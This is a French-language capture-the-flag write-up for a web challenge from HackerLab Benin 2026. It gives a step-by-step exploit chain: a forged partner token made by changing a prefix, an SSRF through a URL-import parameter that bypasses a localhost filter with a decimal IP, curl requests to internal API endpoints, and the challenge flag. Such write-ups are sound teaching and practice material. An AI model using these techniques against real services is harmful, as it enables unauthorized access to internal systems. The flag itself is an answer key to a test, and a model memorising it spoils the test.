---
title: "Northline Q4 · WINDOW"
platform: "HackerLab Benin 2026"
category: "web"
difficulty: "—"
points: 30
os: "—"
date: 2026-11-20
author: "DazBot13-boopt, elielfresnel"
author_github: "DazBot13-boopt"
source: "https://github.com/DazBot13-boopt/hackerlab-benin-2026-wu/blob/main/northline/04-window.md"
tags: [hackerlab-benin-2026, web]
status: published
---

# Last Departure (Northline) : Q4 · WINDOW (30 pts)

> *« L'équipe d'interception a besoin de la fenêtre exacte. »*

## TL;DR

Chaîne SSRF classique : le reçu Northline fournit un token `TRK.<id>.<hmac>`. En changeant le préfixe en `PRT.`, on devient partenaire. `/waybills` importe une URL arbitraire → SSRF vers le service Dispatch interne (bind local). Décimal IP bypass → `/api/operations/.../assignments` donne la fenêtre.

**Flag (format)** : `HLB2026{2024-11-03T22:10:00+00:00/2024-11-03T22:25:00+00:00}` (plusieurs formats acceptés).

## Portail partenaire

Le reçu PDF contient un QR code :

```
TRK.89a68c336ddecef271c90619.6d138d274ad90be7c290bdf3035cc96e
```

La doc interne (`/documentation`) précise le format `<préfixe>.<id>.<hmac>`. Préfixe `PRT` = partenaire :

```bash
curl -c cookies -X POST http://172.28.X.2:8080/login \
  --data-urlencode 'code=PRT.89a68c336ddecef271c90619.6d138d274ad90be7c290bdf3035cc96e'
```

→ session `Skarvik Marine Services`.

## SSRF vers Dispatch

`/waybills` importe une URL via le param `source_url`. Le filtre anti-localhost se contourne avec la **représentation décimale** :

```
127.0.0.1 == 2130706433
```

Le service Dispatch tourne sur le port `8081` et expose :

```
GET /api/shipments/<ref>
GET /api/operations/<op_id>
GET /api/operations/<op_id>/assignments
GET /flag
```

## Pivot sur l'opération

```bash
curl -b cookies -X POST http://172.28.X.2:8080/waybills \
  --data-urlencode 'source_url=http://2130706433:8081/api/shipments/NL-24-7K42'
# → {"operation":"OP-24-7319", ...}

curl -b cookies -X POST http://172.28.X.2:8080/waybills \
  --data-urlencode 'source_url=http://2130706433:8081/api/operations/OP-24-7319/assignments'
```

Deux assignments :

```json
{"id":"ASG-310", "status":"cancelled", ...}
{"id":"ASG-318", "status":"active",
 "meeting_point":"Hangar C4 : quai de service nord",
 "vehicle":"Fourgon bleu nuit",
 "registration":"NV-482-KR",
 "support_id":"NV-USB-84F2",
 "time_start":"2024-11-03T22:10:00+00:00",
 "time_end"  :"2024-11-03T22:25:00+00:00"}
```

## Flag

```
HLB2026{2024-11-03T22:10:00+00:00/2024-11-03T22:25:00+00:00}
```
